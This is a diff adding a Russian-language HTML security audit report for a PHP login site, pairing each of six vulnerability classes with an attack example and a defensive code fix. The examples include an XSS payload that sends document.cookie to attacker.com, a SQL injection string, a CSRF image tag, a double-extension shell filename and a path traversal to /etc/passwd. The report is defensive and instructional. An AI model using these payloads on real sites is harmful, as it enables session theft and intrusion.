@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Отчет по аудиту безопасности</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
+        h1 { color: #2c3e50; border-bottom: 3px solid #3498db; padding-bottom: 10px; }
+        h2 { color: #34495e; margin-top: 30px; }
+        .vulnerability { 
+            background: #f8f9fa; 
+            padding: 20px; 
+            margin: 20px 0; 
+            border-left: 4px solid #3498db;
+            border-radius: 4px;
+        }
+        .code { 
+            background: #2c3e50; 
+            color: #ecf0f1; 
+            padding: 15px; 
+            border-radius: 4px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+        }
+        .fixed { color: #27ae60; font-weight: bold; }
+        .warning { color: #e74c3c; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background: #3498db; color: white; }
+        tr:nth-child(even) { background: #f2f2f2; }
+    </style>
+</head>
+<body>
+
+<h1>🔒 ОТЧЕТ ПО АУДИТУ БЕЗОПАСНОСТИ ВЕБ-ПРИЛОЖЕНИЯ</h1>
+<p><strong>Дата:</strong> <?= date('d.m.Y') ?></p>
+<p><strong>Приложение:</strong> PHP сайт с авторизацией</p>
+
+<h2>📊 Общая информация</h2>
+<table>
+    <tr>
+        <th>Уязвимость</th>
+        <th>Статус</th>
+        <th>Уровень риска</th>
+    </tr>
+    <tr>
+        <td>XSS (Cross-Site Scripting)</td>
+        <td class="fixed">✅ Исправлено</td>
+        <td>Высокий</td>
+    </tr>
+    <tr>
+        <td>SQL Injection</td>
+        <td class="fixed">✅ Защищено</td>
+        <td>Критический</td>
+    </tr>
+    <tr>
+        <td>CSRF (Cross-Site Request Forgery)</td>
+        <td class="fixed">✅ Добавлена защита</td>
+        <td>Высокий</td>
+    </tr>
+    <tr>
+        <td>Information Disclosure</td>
+        <td class="fixed">✅ Исправлено</td>
+        <td>Средний</td>
+    </tr>
+    <tr>
+        <td>Unsafe File Upload</td>
+        <td class="fixed">✅ Реализована безопасная загрузка</td>
+        <td>Высокий</td>
+    </tr>
+    <tr>
+        <td>Insecure Include</td>
+        <td class="fixed">✅ Защищено</td>
+        <td>Средний</td>
+    </tr>
+</table>
+
+<h2>1️⃣ XSS (Cross-Site Scripting)</h2>
+<div class="vulnerability">
+    <h3>Описание уязвимости:</h3>
+    <p>Возможность внедрения вредоносного JavaScript кода в страницы сайта через пользовательский ввод.</p>
+    
+    <h3>Пример атаки:</h3>
+    <div class="code">&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</div>
+    
+    <h3>Примененные методы защиты:</h3>
+    <ul>
+        <li>Экранирование всего пользовательского вывода через <code>htmlspecialchars()</code></li>
+        <li>Создана функция <code>escape()</code> для централизованной защиты</li>
+        <li>Использование <code>ENT_QUOTES</code> для экранирования кавычек</li>
+    </ul>
+    
+    <h3>Пример кода:</h3>
+    <div class="code">
+// Функция защиты от XSS<br>
+function escape($data) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;return htmlspecialchars(trim($data), ENT_QUOTES, 'UTF-8');<br>
+}<br>
+<br>
+// Использование в выводе<br>
+echo escape($_POST['username']);
+    </div>
+</div>
+
+<h2>2️⃣ SQL Injection</h2>
+<div class="vulnerability">
+    <h3>Описание уязвимости:</h3>
+    <p>Внедрение вредоносного SQL-кода через пользовательский ввод для манипуляции базой данных.</p>
+    
+    <h3>Пример атаки:</h3>
+    <div class="code">' OR '1'='1' --</div>
+    
+    <h3>Примененные методы защиты:</h3>
+    <ul>
+        <li>Использование подготовленных выражений (Prepared Statements) PDO</li>
+        <li>Параметризация всех запросов</li>
+        <li>Экранирование данных через привязку параметров</li>
+    </ul>
+    
+    <h3>Пример кода:</h3>
+    <div class="code">
+// Безопасный запрос с подготовленными выражениями<br>
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");<br>
+$stmt->execute([$username]);<br>
+$user = $stmt->fetch(PDO::FETCH_ASSOC);<br>
+<br>
+// Именованные параметры<br>
+$stmt = $pdo->prepare("INSERT INTO users (username, email) VALUES (:username, :email)");<br>
+$stmt->execute(['username' => $username, 'email' => $email]);
+    </div>
+</div>
+
+<h2>3️⃣ CSRF (Cross-Site Request Forgery)</h2>
+<div class="vulnerability">
+    <h3>Описание уязвимости:</h3>
+    <p>Атака, при которой злоумышленник заставляет пользователя выполнить нежелательные действия на сайте, где он авторизован.</p>
+    
+    <h3>Пример атаки:</h3>
+    <div class="code">&lt;img src="http://yoursite.com/transfer.php?amount=1000&to=attacker" width="0"&gt;</div>
+    
+    <h3>Примененные методы защиты:</h3>
+    <ul>
+        <li>Генерация уникального CSRF-токена для каждой сессии</li>
+        <li>Проверка токена во всех POST-запросах</li>
+        <li>Использование <code>hash_equals()</code> для защиты от timing attacks</li>
+    </ul>
+    
+    <h3>Пример кода:</h3>
+    <div class="code">
+// Генерация токена<br>
+function generateCSRFToken() {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;if (!isset($_SESSION['csrf_token'])) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_SESSION['csrf_token'] = bin2hex(random_bytes(32));<br>
+&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+&nbsp;&nbsp;&nbsp;&nbsp;return $_SESSION['csrf_token'];<br>
+}<br>
+<br>
+// Проверка токена<br>
+function verifyCSRFToken($token) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);<br>
+}<br>
+<br>
+// Использование в форме<br>
+&lt;input type="hidden" name="csrf_token" value="&lt;?= generateCSRFToken() ?&gt;"&gt;
+    </div>
+</div>
+
+<h2>4️⃣ Information Disclosure</h2>
+<div class="vulnerability">
+    <h3>Описание уязвимости:</h3>
+    <p>Раскрытие чувствительной информации: пути к файлам, SQL-запросы, версии ПО, ошибки БД.</p>
+    
+    <h3>Примененные методы защиты:</h3>
+    <ul>
+        <li>Отключение отображения ошибок (<code>display_errors = Off</code>)</li>
+        <li>Логирование ошибок в файл</li>
+        <li>Защита конфигурационных файлов через .htaccess</li>
+        <li>Отключение directory listing</li>
+        <li>Кастомизированные сообщения об ошибках</li>
+    </ul>
+    
+    <h3>Пример кода:</h3>
+    <div class="code">
+# В .htaccess<br>
+php_flag display_errors off<br>
+php_flag log_errors on<br>
+php_value error_log /xampp/apache/logs/php_error.log<br>
+<br>
+&lt;Files "config.php"&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;Order allow,deny<br>
+&nbsp;&nbsp;&nbsp;&nbsp;Deny from all<br>
+&lt;/Files&gt;<br>
+<br>
+Options -Indexes<br>
+<br>
+// В config.php<br>
+error_reporting(E_ALL);<br>
+ini_set('display_errors', 0);<br>
+ini_set('log_errors', 1);
+    </div>
+</div>
+
+<h2>5️⃣ File Upload Vulnerabilities</h2>
+<div class="vulnerability">
+    <h3>Описание уязвимости:</h3>
+    <p>Загрузка вредоносных файлов (PHP-шеллы, вирусы) для компрометации сервера.</p>
+    
+    <h3>Пример атаки:</h3>
+    <div class="code">shell.php.jpg (с двойным расширением)</div>
+    
+    <h3>Примененные методы защиты:</h3>
+    <ul>
+        <li>Проверка MIME-типа через <code>finfo_file()</code></li>
+        <li>Проверка расширения файла</li>
+        <li>Ограничение размера файла (2MB)</li>
+        <li>Генерация уникальных имен файлов</li>
+        <li>Хранение файлов вне web-root или с отключенным PHP</li>
+        <li>.htaccess с <code>php_flag engine off</code> в папке загрузок</li>
+    </ul>
+    
+    <h3>Пример кода:</h3>
+    <div class="code">
+// Проверка MIME-типа<br>
+$finfo = finfo_open(FILEINFO_MIME_TYPE);<br>
+$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);<br>
+finfo_close($finfo);<br>
+<br>
+$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];<br>
+if (!in_array($mime_type, $allowed_types)) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;die('Недопустимый тип файла');<br>
+}<br>
+<br>
+// Безопасное имя<br>
+$new_name = uniqid('file_', true) . '.' . $extension;<br>
+<br>
+// Ограничение размера<br>
+if ($_FILES['file']['size'] > 2 * 1024 * 1024) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;die('Файл слишком большой');<br>
+}
+    </div>
+</div>
+
+<h2>6️⃣ Include/Require Vulnerabilities</h2>
+<div class="vulnerability">
+    <h3>Описание уязвимости:</h3>
+    <p>Local/Remote File Inclusion (LFI/RFI) - включение произвольных файлов с сервера или удаленного источника.</p>
+    
+    <h3>Пример атаки:</h3>
+    <div class="code">page.php?file=../../../../etc/passwd</div>
+    
+    <h3>Примененные методы защиты:</h3>
+    <ul>
+        <li>Использование жестко заданных путей</li>
+        <li>Отсутствие пользовательского ввода в include/require</li>
+        <li>Проверка существования директорий</li>
+        <li>Использование <code>__DIR__</code> для абсолютных путей</li>
+    </ul>
+    
+    <h3>Пример кода:</h3>
+    <div class="code">
+// Безопасное подключение<br>
+require __DIR__ . '/config.php';<br>
+require __DIR__ . '/lib/security.php';<br>
+<br>
+// Проверка путей<br>
+$base_path = __DIR__;<br>
+if (!is_dir($base_path . '/lib')) {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;error_log('Critical: lib directory not found');<br>
+&nbsp;&nbsp;&nbsp;&nbsp;die('System error');<br>
+}
+    </div>
+</div>
+
+<h2>📋 Рекомендации</h2>
+<div class="vulnerability">
+    <h3>Дополнительные меры безопасности:</h3>
+    <ul>
+        <li>✅ Использовать HTTPS (SSL/TLS)</li>
+        <li>✅ Реализовать rate limiting для предотвращения brute-force атак</li>
+        <li>✅ Добавить Content Security Policy (CSP) заголовки</li>
+        <li>✅ Регулярно обновлять PHP и зависимости</li>
+        <li>✅ Использовать HttpOnly и Secure флаги для cookies</li>
+        <li>✅ Реализовать logout при неактивности</li>
+        <li>✅ Валидировать и санировать все входные данные</li>
+    </ul>
+</div>
+
+<h2>✅ Заключение</h2>
+<p>Все критические и высокие уязвимости были найдены и устранены. Приложение соответствует базовым стандартам безопасности OWASP.</p>
+
+</body>
+</html>
